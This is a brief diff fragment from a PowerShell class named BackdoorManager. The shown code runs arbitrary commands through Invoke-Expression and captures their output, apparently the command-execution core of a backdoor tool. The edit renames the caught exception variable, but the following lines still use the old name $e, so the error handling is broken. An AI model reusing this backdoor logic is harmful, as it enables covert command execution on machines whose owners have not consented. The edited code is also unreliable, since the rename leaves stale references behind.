@@ -64,7 +64,7 @@ class BackdoorManager {
             $output = Invoke-Expression $command | Out-String
         }
         catch {
-            $e = $_.Exception
+            $powershellException = $_.Exception
             $msg = $e.Message
             $output = "`n$e`n"
         }
